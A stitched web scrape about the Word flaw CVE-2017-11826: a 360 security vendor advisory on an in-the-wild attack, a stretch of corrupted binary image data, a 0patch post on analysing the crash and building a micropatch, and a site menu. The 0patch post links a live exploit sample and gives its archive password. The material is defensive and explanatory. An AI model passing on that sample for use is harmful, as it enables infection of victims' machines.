[![Office 0day attack](https://static.ts.360.com/blog/wp-content/uploads/2017/10/170417-blog-word_hack.png)](https://static.ts.360.com/blog/wp-content/uploads/2017/10/170417-blog-word_hack.png)Author:¬†[360 Core Security](http://360coresec.blogspot.tw/2017/10/new-office-0day-cve-2017-11826.html?m=1)

On September 28, 2017, Qihoo 360 Core Security (@[360CoreSec](https://twitter.com/360CoreSec)) detected an in-the-wild attack that leveraged CVE-2017-11826, an Office 0day vulnerability. This vulnerability exists in all the supported Office versions. The attack only targeted limited customers. The attacker embedded malicious .docx in the RTF files. Through reversing analysis of the sample C&C, we found that the attack was initiated in August and the launch date of the attack can be dated back to September. It was in this time window that the vulnerability has been exploited as a 0day.

Qihoo 360 Core Security has been the first security vendor to share the details of the vulnerability and coordinated with Microsoft to disclose the news, as well as a timely patch to resolve the Office 0day vulnerability in a week.

The latest version of 360 Total Security products could detect and prevent exploitation of this vulnerability. In the meanwhile, we also highly suggest users to update Microsoft Patch in time.

## The In-the-Wild Attack

This attack that Qihoo 360 detected in the wild is initiated with RTF (Rich Text Format) files. The RTF file contains highly targeted phishing subfiles to allure user to open. The attacker triggered a remote arbitrary code execution by using Microsoft Word tags and corresponding attributions. The payload delivery is showed in the below procedure. In this process, the execution code took advantage of a dll hijack vulnerability from a well-known security software. Afterwards, a remote Trojan aiming at stealing sensitive data was installed in the victims‚Äô devices.

[![New Office 0day Exploited in the Wild](https://static.ts.360.com/blog/wp-content/uploads/2017/10/1.png)](https://static.ts.360.com/blog/wp-content/uploads/2017/10/1.png)

[![Payload Delivery](https://static.ts.360.com/blog/wp-content/uploads/2017/10/Screen-Shot-2017-10-11-at-14.35.22.png)](https://static.ts.360.com/blog/wp-content/uploads/2017/10/Screen-Shot-2017-10-11-at-14.35.22.png)

## Summary & Security Advice

Upon the detection of this 0day vulnerability, 360 has released a hot patch which is available in the latest updates. It enables 360 users to avoid attacks exploiting this new Office vulnerability before Patch Tuesday. Attacks using Office 0day vulnerabilities targeting common users have been increasing since the beginning of 2017.

We would like to send a kind reminder to all users that please do not to open any unknown Office files. Organizations and enterprises should also be aware of this new 0day and be more cautious of related malicious behaviors. It is also highly recommended to update your 360 Total Security software to protect your devices against any potential attacks.

## **Acknowledgement**

Thanks to Yang Kang, Ding Maoyin, Song Shenlei, Qihoo 360 Core Security and Microsoft Active Protections Program (MAPP) for their contributions to this blog. We also thank everyone from the Microsoft Security Response Center (MSRC) who worked with us in resolving this issue.

https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11826

[Learn more about 360 Total Security](//www.360totalsecurity.com/en/ "Learn more about 360 Total Security")

Share:

Related Articles

* [![](https://static.ts.360.com/blog/wp-content/uploads/2018/11/TLauncher-logo.jpg)](https://blog.360totalsecurity.com/en/tlauncher-software-security-testing-and-evaluation/ "TLauncher Software Security Testing and Evaluation")

  [TLauncher Software Security Testing and Evaluation](https://blog.360totalsecurity.com/en/tlauncher-software-security-testing-and-evaluation/ "TLauncher Software Security Testing and Evaluation")
* [![](https://static.ts.360.com/blog/wp-content/uploads/2020/07/BlogÂ∞ÅÈù¢01.png)](https://blog.360totalsecurity.com/en/win11-users-beware-magniber-ransomware-has-been-upgraded-again-aiming-at-win11/ "Win11 users beware! Magniber ransomware has been upgraded again, aiming at win11")

  [Win11 users beware! Magniber ransomware has been upgraded again, aiming at win11](https://blog.360totalsecurity.com/en/win11-users-beware-magniber-ransomware-has-been-upgraded-again-aiming-at-win11/ "Win11 users beware! Magniber ransomware has been upgraded again, aiming at win11")
* [![](https://static.ts.360.com/blog/wp-content/uploads/2022/02/2.28.9.png)](https://blog.360totalsecurity.com/en/exclusive-in-depth-analysis-directly-attack-the-key-technical-details-of-ukraines-cyber-warfare/ "Exclusive in-depth analysis: directly attack the key technical details of Ukraine‚Äôs cyber warfare")

  [Exclusive in-depth analysis: directly attack the key technical details of Ukraine‚Äôs cyber warfare](https://blog.360totalsecurity.com/en/exclusive-in-depth-analysis-directly-attack-the-key-technical-details-of-ukraines-cyber-warfare/ "Exclusive in-depth analysis: directly attack the key technical details of Ukraine‚Äôs cyber warfare")
* [![](https://static.ts.360.com/blog/wp-content/uploads/2021/12/1214.7.png)](https://blog.360totalsecurity.com/en/urgent-minecraft-players-are-under-massive-attack/ "Urgent! Minecraft players are under massive attack")

  [Urgent! Minecraft players are under massive attack](https://blog.360totalsecurity.com/en/urgent-minecraft-players-are-under-massive-attack/ "Urgent! Minecraft players are under massive attack")

[Facebook](https://www.facebook.com/360safe)
[Twitter](https://twitter.com/360TotalSec)

[VK](https://vk.com/totalsecurity)

![360 Total Security](//static.ts.360.com/blog/theme/images/360_logo_wide-16709043.png)
[Free Download](//www.360totalsecurity.com/en/download-free-antivirus/360-total-security/?referral=QkxPRw.MzgxMg.1737864452 "Free Download")
For Windows 10/8.1/8/7/Vista/XP (32,64bit)

Top Articles

* [![blog_image](//static.ts.360.com/blog/theme/images/blog_default-4682dbd4.png)](https://blog.360totalsecurity.com/en/attackers-fake-computational-power-steal-cryptocurrencies-mining-pools/)
  ## [Attackers Fake Computational Power to Steal CryptoCurrencies from Mining Pools](https://blog.360totalsecurity.com/en/attackers-fake-computational-power-steal-cryptocurrencies-mining-pools/ "Attackers Fake Computational Power to Steal CryptoCurrencies from Mining Pools")
* [![](https://static.ts.360.com/blog/wp-content/uploads/2020/07/BlogÂ∞ÅÈù¢02.png)](https://blog.360totalsecurity.com/en/new-infection-chain-of-njrat-variant/)
  ## [New infection chain of njRAT variant](https://blog.360totalsecurity.com/en/new-infection-chain-of-njrat-variant/ "New infection chain of njRAT variant")
* [![](https://static.ts.360.com/blog/wp-content/uploads/2017/01/170118_blog_elasticSearch.png)](https://blog.360totalsecurity.com/en/mongodb-attackers-hijacked-elasticsearch-servers-ransom/)
  ## [MongoDB attackers hijacked ElasticSearch servers for ransom](https://blog.360totalsecurity.com/en/mongodb-attackers-hijacked-elasticsearch-servers-ransom/ "MongoDB attackers hijacked ElasticSearch servers for ransom")
* [![](https://static.ts.360.com/blog/wp-content/uploads/2017/05/170515_fb_blog_biggest-ransomware-2-2.png)](https://blog.360totalsecurity.com/en/safe-tips-for-wannacry-ransomware-attack/)
  ## [Biggest Ransomware Attack Ever ‚Äì Tips to stay safe from WannaCry ransomware](https://blog.360totalsecurity.com/en/safe-tips-for-wannacry-ransomware-attack/ "Biggest Ransomware Attack Ever ‚Äì Tips to stay safe from WannaCry ransomware")

> [360 Total Security](https://www.facebook.com/360safe)

Products
[360 Total Security](//www.360totalsecurity.com/features/360-total-security/)

[360 Total Security Essential](//www.360totalsecurity.com/features/360-total-security-essential/)

[360 Total Security Premium](//www.360totalsecurity.com/360-premium-membership/)

[360 Total Security for Mac](//www.360totalsecurity.com/features/360-total-security-mac/)

[360 Total Security for Business](//www.360totalsecurity.com/business/)

News
[Products](https://blog.360totalsecurity.com/en/category/products/)[Company News](https://blog.360totalsecurity.com/en/category/company-news/)[Security News](https://blog.360totalsecurity.com/en/category/security-news/)
[Presskit](https://static.ts.360.com/home/resources/press/360-total-security-presskit-372d9bb7.pdf)

[Investor Announcement](//www.360totalsecurity.com/announcement/)

Contact us
[Support](//www.360totalsecurity.com/help/premium/)

[Qihoo 360](//www.360totalsecurity.com/about/)

Business Partner
[Affiliate](//www.360totalsecurity.com/affiliate/)

[Reseller](//www.360totalsecurity.com/reseller/)

¬© 2014 - 2023 Qihu 360 Software Co. Limited



=== Content from www.tarlogic.com_0a476f7d_20250126_040719.html ===
ÔøΩÔøΩÔøΩÔøΩ JFIF  H H  ÔøΩÔøΩ C ÔøΩÔøΩ CÔøΩÔøΩ   T ÔøΩÔøΩ                
ÔøΩÔøΩ -         !1 
"A5ÔøΩ#EQqÔøΩÔøΩ               ÔøΩÔøΩ 2          !1AQaqÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ"2BRcÔøΩÔøΩÔøΩÔøΩÔøΩ   ? ÔøΩÔøΩÔøΩÔøΩZÔøΩ8ÔøΩÔøΩ…ïÔøΩÔøΩJ€±ÔøΩÔøΩW++ÔøΩCÔøΩÔøΩ09ÔøΩLÔøΩ`&ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩO#9ÔøΩZÔøΩVHwvÔøΩÔøΩ/aÔøΩÔøΩ|œÉÃñÔøΩ+ÔøΩ%ÔøΩ;\_ÔøΩÔøΩÔøΩÔøΩ>yÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ≈¨^›óÔøΩÔøΩ$ÔøΩp\*mÔøΩÔøΩJPÔøΩ"ÔøΩÔøΩ$%}ÔøΩxÔøΩ|ÔøΩRÔøΩÔøΩﬁÖÔøΩÔøΩi
'ÔøΩ&Q j¬æÔøΩAEÔøΩÔøΩÔøΩD!^(fÔøΩÔøΩÔøΩKÓêÄÔøΩD?›áÔøΩÔøΩ]N$—üÔøΩÔøΩÔøΩ5sÔøΩzÔøΩR6ÔøΩÔøΩÔøΩ}#"\_#ÔøΩÔøΩÔøΩÔøΩÔøΩ-DÔøΩ":ÔøΩbÔøΩÔøΩÔøΩÔøΩS'ÔøΩxÔøΩyÔøΩƒØ'ÔøΩwnÔøΩÔøΩ÷ér)ÔøΩEÔøΩ0ÔøΩÔøΩ&Z=ÔøΩÔøΩ~IÔøΩÔøΩVÔøΩjÔøΩÔøΩÔøΩi
TÔøΩÔøΩÔøΩÔøΩatÔøΩ
ÔøΩ.tuÔøΩÔøΩNVÔøΩÔøΩÔøΩÔøΩz^f&zVÔøΩÔøΩÔøΩ ÔøΩÔøΩhÔøΩÔøΩÔøΩ'jEÔøΩZTYÔøΩ:ÔøΩ6ÔøΩÔøΩ $ÔøΩ~iÔøΩÔøΩÔøΩÔøΩtÔøΩÔøΩ6QrÔøΩ:ÔøΩR1ÔøΩÔøΩÔøΩ NAÔøΩÔøΩÔøΩÔøΩÔøΩ:B(2sgrÔøΩÔøΩ~ÔøΩ^GÔøΩ<ÔøΩ=ÔøΩÔøΩGÔøΩq›∑&eÔøΩﬁ•ﬁñ‡º±ÔøΩZÔøΩZÔøΩÔøΩÔøΩIE&KT}6ÔøΩÔøΩ!ÔøΩÃÇhÔøΩÔøΩ9ÔøΩDŸèÔøΩEÔøΩKÔøΩaR-ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩn&ÔøΩÔøΩwÔøΩ
Ïª¥W,ÔøΩÔøΩifÔøΩ]ÔøΩÔøΩÔøΩ+QÔøΩmÔøΩÔøΩÔøΩÔøΩÔøΩfÔøΩÔøΩSTNÔøΩVÔøΩ
ÔøΩÔøΩ\*ÔøΩ ÔøΩÔøΩ2fLÔøΩIN`ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩIJÔøΩÔøΩKÔøΩynaÔøΩ$ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ.ÔøΩoÔøΩrÔøΩ!ÔøΩp\bT7$—ΩhÔøΩÔøΩÔøΩpIÔøΩD{ÔøΩG`ÔøΩXÔøΩ%ÔøΩSkÔøΩÔøΩÔøΩcgÔøΩ…™ÔøΩÔøΩ{GSÔøΩ@<ÔøΩÔøΩJÔøΩXWÔøΩ<'ÔøΩÔøΩ5ÔøΩ3ÔøΩÔøΩIÔøΩÔøΩE/ÔøΩÔøΩhÔøΩÔøΩ\*ÔøΩÔøΩÔøΩqÔøΩ(ÔøΩ4ÔøΩZ7NÔøΩ.ÔøΩSÔøΩÔøΩiÔøΩÔøΩ.ÔøΩÔøΩD`D7ÔøΩYÔøΩÔøΩÔøΩ÷©S&ÔøΩÔøΩqÔøΩÔøΩÔ´àÔøΩÔøΩÔøΩR\PuÔøΩÔøΩ?ÔøΩÔøΩ

=== Content from 0patch.blogspot.com_3bfe6a6b_20250124_222945.html ===


# [0patch Blog](https://blog.0patch.com/)

Security Patching Simplified To The Extreme

## Thursday, November 9, 2017

Posted by

[Mitja Kolsek](https://www.blogger.com/profile/00089863558178974677 "author profile")

on

[November 09, 2017](https://blog.0patch.com/2017/11/0patching-pretty-nasty-microsoft-word.html "permanent link")

### 0patching a Pretty Nasty Microsoft Word Type Confusion Vulnerability (CVE-2017-11826)

by Mitja Kolsek, the 0patch Team

In September 2017, [Qihoo 360 Core Security detected an in-the-wild attack](https://blog.360totalsecurity.com/en/new-office-0day-cve-2017-11826/) that leveraged an Office 0day vulnerability now known as CVE-2017-11826. The attack employed an RTF document with embedded DOCX Word documents, whereby one of them exploited the vulnerability to cause type confusion in the OOXML parser, Microsoft's parser for Office Open XML File Formats. Additional noteworthy analyses of this vulnerability subsequently came from [McAfee](https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-microsoft-office-zero-day-exploit-cve-2017-11826-memory-corruption-vulnerability/) and [Kaspersky](https://securelist.com/analyzing-an-exploit-for-%D1%81ve-2017-11826/82869/).

Yang Kang, Ding Maoyin and Song Shenlei of Qihoo 360 Core Security reported this issue to Microsoft, which fixed it in their [October security update](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11826).

This vulnerability is particularly easy to exploit, as it only requires the user to open a malicious RTF document in Word (which is the default RTF editor when installed), and isn't mitigated by Word's Protected View. It is actually surprising that it's not getting exploited more widely, as attackers know very well that many organizations need [weeks or months to apply software updates](https://blog.0patch.com/2016/01/bridging-security-update-gap-with-0patch.html).

Once we got the [exploit file](https://drive.google.com/file/d/0B8AlLxKo4rqLQmd1eXpZcVByUGc/view)\* we could start the analysis. We first minimized the exploit file by removing unnecessary payload and effectively turning it into a crash PoC. Turning a working exploit (one that reliably executes malicious code) into a crash case is an important step for us because in contrast to malware analysts, we're not interested in what malware does when it gets control, but only **how** it gets control. Making an exploit crash instead of execute its code generally leads us closer to the vulnerability that gets exploited - and closer to writing a patch for it. It's also easier to test a patch, once you have one, with a simple and quick test case.

\* Exercise caution with this exploit file - it may run malware on your computer. (Password is *aiongnostes1004*.)

**Analysis**

Opening the crash PoC in Word 2010 crashes immediately with a call to an illegal address:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikv-bbHpITSu68hekai0K0MAnL6V30m3A461d6Dw8yzNXPQyxuMC1QuXTleIxgVW4Summu9xtTGLJFpwccg_ZSQIr_qyQiqNjfs-t4JFXRYbvmdU9rkr8ygHEbz2ix5UoAZ09MeXA0j0pC/s1600/windbg_crash.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikv-bbHpITSu68hekai0K0MAnL6V30m3A461d6Dw8yzNXPQyxuMC1QuXTleIxgVW4Summu9xtTGLJFpwccg_ZSQIr_qyQiqNjfs-t4JFXRYbvmdU9rkr8ygHEbz2ix5UoAZ09MeXA0j0pC/s1600/windbg_crash.PNG)

This looks like a call to a vtable function, and since we already learned from Kaspersky above that we're dealing with a type confusion issue, it's likely that we're looking at a case of code processing an object of some expected type with the address at ecx+4 supposedly pointing to a valid function, while the object is actually of a different type.

Type confusion flaws are not the easiest kind to patch if you don't have the source code. While the fix is usually in the form "if type != EXPECTED\_TYPE goto GET\_OUT\_OF\_HERE", it's not trivial to figure out where the said type resides in the object without looking around the code where else the same type may be used. Once you have that figured out, it's relatively simple to determine the EXPECTED\_TYPE by observing the type value with legitimate test cases and comparing that to the value when you process the PoC. Finding a suitable GET\_OUT\_OF\_HERE location also needs some figuring out: you want the patched code to escape the flaw gracefully without leaving a corrupted state or cutting off some legitimate functionality. So sometimes this can get time consuming - but in this case, we had the official fix so we could peek into what Microsoft did to correct this flaw.

Diffing the patched wwlib.dll with the latest vulnerable one revealed very few changes. In fact, the only noteworthy change was in the exact function containing the above call that crashes. Let's look at the diff:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvuj2I1P2URHOBLIHxm2WYo1UBWnOn5uOivKkM5nViVPEzDanYlaQO4tDqJmItxuDy9K2i-Z4hOVQDmhpu_9U0N_EFTxeDfZ-uIkNF-klnRs4mzWGMOu9Zv-HAF3ZBZY7AlyoW9w3MBiS_/s640/diff_comments.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvuj2I1P2URHOBLIHxm2WYo1UBWnOn5uOivKkM5nViVPEzDanYlaQO4tDqJmItxuDy9K2i-Z4hOVQDmhpu_9U0N_EFTxeDfZ-uIkNF-klnRs4mzWGMOu9Zv-HAF3ZBZY7AlyoW9w3MBiS_/s1600/diff_comments.png)

The patched function is on the left, the vulnerable on the right (click the image to magnify). It's easy to see that the patched function introduced a branch before the grey-marked code in the vulnerable function. And it looks exactly like "if type != EXPECTED\_TYPE goto GET\_OUT\_OF\_HERE": it starts with a check for a specific value, and if there is no match, execution is diverted to some new code (marked "Safe exit code" above), which avoids the call that crashed.

The only surprise is that instead of seeing a comparison of some type variable with some type constant (usually a small number, resulting from an enum clause in the source code), we see a comparison with a function address:

cmp ds:[eax+0x48], 0x31E94A4A

Note that 0x31E94A4A is actually an address of some function in wwlib.dll, which gets stored to the address pointed to by eax+0x48 a couple of blocks earlier in the same patched function. So what Microsoft's patch seems so do is check the validity of the object not by inspecting its type (perhaps there is no type ID in the structure at all), but by inspecting the address of a function pointed to by the object. Why not - as long as it works. No one in the world knows this code better than Microsoft's developers and if they thought this was the best possible fix, they're probably right.

**Patching**

Without further analysis, we can clone the same logic to the vulnerable code. The only thing we add is the "Exploit Attempt Blocked" dialog in case the object type is found to be incorrect. And here is the result:

**What Do You Do Now?**

We wrote a CVE-2017-11826 micropatch for 32-bit Word 2010's wwlib.dll version 14.0.7182.5000. While it's generally simple, and often fully automatable, to port a micropatch to other module versions, we prefer to do that on demand for now. So if you're running any affected Office version and for any reason can't apply Microsoft's official update (yet) but would like to be protected from this highly exploitable vulnerability, do let us know at support@0patch.com. We'll port the micropatch to your version and make it available for everyone else too.

If you are a security researcher and have a non-public proof-of-concept for some vulnerability, consider either writing a micropatch for it (using [0patch Agent for Developers](https://blog.0patch.com/2017/02/one-step-closer-to-crowdpatching-and.html)) or sharing the PoC with us so we can create a micropatch together. You'll see it's almost as fun to thoroughly break someone's exploit as it is to write one ;)

Cheers!

[@mkolsek](https://twitter.com/mkolsek)

[@0patch](https://twitter.com/0patch)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7114610046316422325&postID=6504981846649496712&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=6504981846649496712&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=6504981846649496712&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=6504981846649496712&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=6504981846649496712&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7114610046316422325&postID=6504981846649496712&target=pinterest "Share to Pinterest")

#### No comments:

#### Post a Comment

[Newer Post](https://blog.0patch.com/2017/11/did-microsoft-just-manually-patch-their.html "Newer Post")

[Older Post](https://blog.0patch.com/2017/11/office-dde-exploits-and-attack-surface.html "Older Post")

[Home](https://blog.0patch.com/)

Subscribe to:
[Post Comments (Atom)](https://blog.0patch.com/feeds/6504981846649496712/comments/default)

## About 0patch

[0patch](https://0patch.com) (pronounced 'zero patch') is a platform for instantly distributing, applying and removing microscopic binary patches to/from running processes without having to restart these processes (much less reboot the entire computer). Brought to you by [ACROS Security](https://www.acrossecurity.com).

[Follow @0patch](https://twitter.com/0patch)

## Blog Archive

* ‚ñ∫
  [2025](https://blog.0patch.com/2025/)
  (1)
  + ‚ñ∫
    [January](https://blog.0patch.com/2025/01/)
    (1)

* ‚ñ∫
  [2024](https://blog.0patch.com/2024/)
  (23)
  + ‚ñ∫
    [December](https://blog.0patch.com/2024/12/)
    (1)
  + ‚ñ∫
    [November](https://blog.0patch.com/2024/11/)
    (4)
  + ‚ñ∫
    [October](https://blog.0patch.com/2024/10/)
    (2)
  + ‚ñ∫
    [September](https://blog.0patch.com/2024/09/)
    (1)
  + ‚ñ∫
    [July](https://blog.0patch.com/2024/07/)
    (2)
  + ‚ñ∫
    [June](https://blog.0patch.com/2024/06/)
    (2)
  + ‚ñ∫
    [May](https://blog.0patch.com/2024/05/)
    (1)
  + ‚ñ∫
    [April](https://blog.0patch.com/2024/04/)
    (4)
  + ‚ñ∫
    [March](https://blog.0patch.com/2024/03/)
    (1)
  + ‚ñ∫
    [February](https://blog.0patch.com/2024/02/)
    (4)
  + ‚ñ∫
    [January](https://blog.0patch.com/2024/01/)
    (1)

* ‚ñ∫
  [2023](https://blog.0patch.com/2023/)
  (26)
  + ‚ñ∫
    [November](https://blog.0patch.com/2023/11/)
    (3)
  + ‚ñ∫
    [October](https://blog.0patch.com/2023/10/)
    (3)
  + ‚ñ∫
    [September](https://blog.0patch.com/2023/09/)
    (2)
  + ‚ñ∫
    [August](https://blog.0patch.com/2023/08/)
    (1)
  + ‚ñ∫
    [July](https://blog.0patch.com/2023/07/)
    (1)
  + ‚ñ∫
    [June](https://blog.0patch.com/2023/06/)
    (5)
  + ‚ñ∫
    [May](https://blog.0patch.com/2023/05/)
    (1)
  + ‚ñ∫
    [April](https://blog.0patch.com/2023/04/)
    (1)
  + ‚ñ∫
    [March](https://blog.0patch.com/2023/03/)
    (5)
  + ‚ñ∫
    [February](https://blog.0patch.com/2023/02/)
    (2)
  + ‚ñ∫
    [January](https://blog.0patch.com/2023/01/)
    (2)

* ‚ñ∫
  [2022](https://blog.0patch.com/2022/)
  (26)
  + ‚ñ∫
    [December](https://blog.0patch.com/2022/12/)
    (3)
  + ‚ñ∫
    [October](https://blog.0patch.com/2022/10/)
    (6)
  + ‚ñ∫
    [September](https://blog.0patch.com/2022/09/)
    (3)
  + ‚ñ∫
    [August](https://blog.0patch.com/2022/08/)
    (2)
  + ‚ñ∫
    [July](https://blog.0patch.com/2022/07/)
    (2)
  + ‚ñ∫
    [June](https://blog.0patch.com/2022/06/)
    (3)
  + ‚ñ∫
    [May](https://blog.0patch.com/2022/05/)
    (2)
  + ‚ñ∫
    [March](https://blog.0patch.com/2022/03/)
    (4)
  + ‚ñ∫
    [January](https://blog.0patch.com/2022/01/)
    (1)

* ‚ñ∫
  [2021](https://blog.0patch.com/2021/)
  (23)
  + ‚ñ∫
    [December](https://blog.0patch.com/2021/12/)
    (2)
  + ‚ñ∫
    [November](https://blog.0patch.com/2021/11/)
    (3)
  + ‚ñ∫
    [October](https://blog.0patch.com/2021/10/)
    (2)
  + ‚ñ∫
    [September](https://blog.0patch.com/2021/09/)
    (1)
  + ‚ñ∫
    [August](https://blog.0patch.com/2021/08/)
    (3)
  + ‚ñ∫
    [July](https://blog.0patch.com/2021/07/)
    (2)
  + ‚ñ∫
    [June](https://blog.0patch.com/2021/06/)
    (1)
  + ‚ñ∫
    [May](https://blog.0patch.com/2021/05/)
    (3)
  + ‚ñ∫
    [March](https://blog.0patch.com/2021/03/)
    (2)
  + ‚ñ∫
    [February](https://blog.0patch.com/2021/02/)
    (2)
  + ‚ñ∫
    [January](https://blog.0patch.com/2021/01/)
    (2)

* ‚ñ∫
  [2020](https://blog.0patch.com/2020/)
  (19)
  + ‚ñ∫
    [December](https://blog.0patch.com/2020/12/)
    (2)
  + ‚ñ∫
    [November](https://blog.0patch.com/2020/11/)
    (2)
  + ‚ñ∫
    [September](https://blog.0patch.com/2020/09/)
    (1)
  + ‚ñ∫
    [August](https://blog.0patch.com/2020/08/)
    (2)
  + ‚ñ∫
    [July](https://blog.0patch.com/2020/07/)
    (3)
  + ‚ñ∫
    [June](https://blog.0patch.com/2020/06/)
    (2)
  + ‚ñ∫
    [May](https://blog.0patch.com/2020/05/)
    (2)
  + ‚ñ∫
    [March](https://blog.0patch.com/2020/03/)
    (1)
  + ‚ñ∫
    [February](https://blog.0patch.com/2020/02/)
    (2)
  + ‚ñ∫
    [January](https://blog.0patch.com/2020/01/)
    (2)

* ‚ñ∫
  [2019](https://blog.0patch.com/2019/)
  (7)
  + ‚ñ∫
    [September](https://blog.0patch.com/2019/09/)
    (1)
  + ‚ñ∫
    [June](https://blog.0patch.com/2019/06/)
    (1)
  + ‚ñ∫
    [April](https://blog.0patch.com/2019/04/)
    (2)
  + ‚ñ∫
    [February](https://blog.0patch.com/2019/02/)
    (2)
  + ‚ñ∫
    [January](https://blog.0patch.com/2019/01/)
    (1)

* ‚ñ∫
  [2018](https://blog.0patch.com/2018/)
  (11)
  + ‚ñ∫
    [October](https://blog.0patch.com/2018/10/)
    (2)
  + ‚ñ∫
    [September](https://blog.0patch.com/2018/09/)
    (2)
  + ‚ñ∫
    [August](https://blog.0patch.com/2018/08/)
    (1)
  + ‚ñ∫
    [May](https://blog.0patch.com/2018/05/)
    (2)
  + ‚ñ∫
    [March](https://blog.0patch.com/2018/03/)
    (1)
  + ‚ñ∫
    [February](https://blog.0patch.com/2018/02/)
    (1)
  + ‚ñ∫
    [January](https://blog.0patch.com/2018/01/)
    (2)

* ‚ñº
  [2017](https://blog.0patch.com/2017/)
  (19)
  + ‚ñ∫
    [December](https://blog.0patch.com/2017/12/)
    (1)
  + ‚ñº
    [November](https://blog.0patch.com/2017/11/)
    (4)
    - [Microsoft's Manual Binary Patch For CVE-2017-11882...](https://blog.0patch.com/2017/11/official-patch-for-cve-2017-11882-meets.html)
    - [Did Microsoft Just Manually Patch Their Equation E...](https://blog.0patch.com/2017/11/did-microsoft-just-manually-patch-their.html)
    - [0patching a Pretty Nasty Microsoft Word Type Confu...](https://blog.0patch.com/2017/11/0patching-pretty-nasty-microsoft-word.html)
    - [Office DDE Exploits and Attack Surface Reduction](https://blog.0patch.com/2017/11/office-dde-exploits-and-attack-surface.html)
  + ‚ñ∫
    [October](https://blog.0patch.com/2017/10/)
    (2)
  + ‚ñ∫
    [September](https://blog.0patch.com/2017/09/)
    (2)
  + ‚ñ∫
    [August](https://blog.0patch.com/2017/08/)
    (1)
  + ‚ñ∫
    [July](https://blog.0patch.com/2017/07/)
    (1)
  + ‚ñ∫
    [June](https://blog.0patch.com/2017/06/)
    (1)
  + ‚ñ∫
    [May](https://blog.0patch.com/2017/05/)
    (1)
  + ‚ñ∫
    [March](https://blog.0patch.com/2017/03/)
    (2)
  + ‚ñ∫
    [February](https://blog.0patch.com/2017/02/)
    (3)
  + ‚ñ∫
    [January](https://blog.0patch.com/2017/01/)
    (1)

* ‚ñ∫
  [2016](https://blog.0patch.com/2016/)
  (7)
  + ‚ñ∫
    [September](https://blog.0patch.com/2016/09/)
    (1)
  + ‚ñ∫
    [July](https://blog.0patch.com/2016/07/)
    (1)
  + ‚ñ∫
    [June](https://blog.0patch.com/2016/06/)
    (3)
  + ‚ñ∫
    [January](https://blog.0patch.com/2016/01/)
    (2)

## LinkedIn and Google tags

  ![](https://px.ads.linkedin.com/collect/?pid=1234785&fmt=gif)

|  |  |
| --- | --- |

Copyright ACROS Security / 0patch. Powered by [Blogger](https://www.blogger.com).



=== Content from www.tarlogic.com_9a75cb07_20250126_040720.html ===


* [Home](/)
* [Services](https://www.tarlogic.com/cybersecurity-services/)
  + Advanced penetration testing services
    - [Red Team services](https://www.tarlogic.com/red-team-services/)
    - [External & internal pentesting](https://www.tarlogic.com/penetration-testing-services/ "Penetration Testing services")
    - [Social Engineering](https://www.tarlogic.com/social-engineering/)
    - [Wi-Fi Pentest](https://www.tarlogic.com/wifi-pentest/)
    - Cyber intelligence services
    - [Threat Intelligence](https://www.tarlogic.com/threat-intelligence/)
    - [Digital surveillance](https://www.tarlogic.com/digital-surveillance/)
    - [Fraud investigation and analysis](https://www.tarlogic.com/fraud-investigation/ "Fraud investigation ")
    - [Strategic Cyber-Intelligence](https://www.tarlogic.com/strategic-cyber-intelligence/ "Strategic Cyber Intelligence")
  + Security assessment services
    - [Web Security Audit](https://www.tarlogic.com/website-security-audit/ "Website security audit")
    - [Mobile Application Security Test Audit](https://www.tarlogic.com/mobile-app-audit/ "Mobile application security audits")
    - [IOT Security testing](https://www.tarlogic.com/iot-security-testing/ "IoT Security assessment")
    - [Cloud Infrastructures security audit](https://www.tarlogic.com/cloud-security-assessment/ "Cloud security assessment")
    - [Reverse Engineering & Hardware Hacking](https://www.tarlogic.com/hardware-hacking-and-reverse-engineering-services/ "Reverse Engineering")
    - [Code Security Audit](https://www.tarlogic.com/code-security-audit/)
    - [Technologies and Operating Systems Hardening](https://www.tarlogic.com/operating-system-hardening/ "Hardening")
    - [Advanced Bank Infrastructures Security Assessment](https://www.tarlogic.com/advanced-bank-security-assessment/ "Bank Infrastructures Security Assessment")
  + Attack Surface Reduction services
    - [Vulnerability Management](https://www.tarlogic.com/vulnerability-management/ "Vulnerability management service")
    - [Emerging vulnerabilities 24√ó7](https://www.tarlogic.com/emerging-vulnerabilities/ "Emerging vulnerability management service")
    - [Denial of service simulation (DoS)](https://www.tarlogic.com/dos-test/ "Denial of service test")
    - [Managed Bug Bounty program](https://www.tarlogic.com/bug-bounty/ "Bug bounty service")
    - [Dynamic Risk Assessment and Threat Prioritization](https://www.tarlogic.com/threat-priorization/ "Threat Priorization")
    - Protection and response
    - [Threat Hunting services](https://www.tarlogic.com/threat-hunting/ "Threat Hunting")
    - [Incident Response Services](https://www.tarlogic.com/incident-response/ "Incident Response")
* [BlackArrow](https://www.tarlogic.com/blackarrow/)
* [Blog](https://www.tarlogic.com/blog/)
* [Contact](https://www.tarlogic.com/contact/ "Contactar con tarlogic")
* [EN](https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/ "EN")
  + [ES](https://www.tarlogic.com/es/blog/explotando-word-cve-2017-11826/ "ES")

* EN
  + [ES](https://www.tarlogic.com/es/blog/explotando-word-cve-2017-11826/)

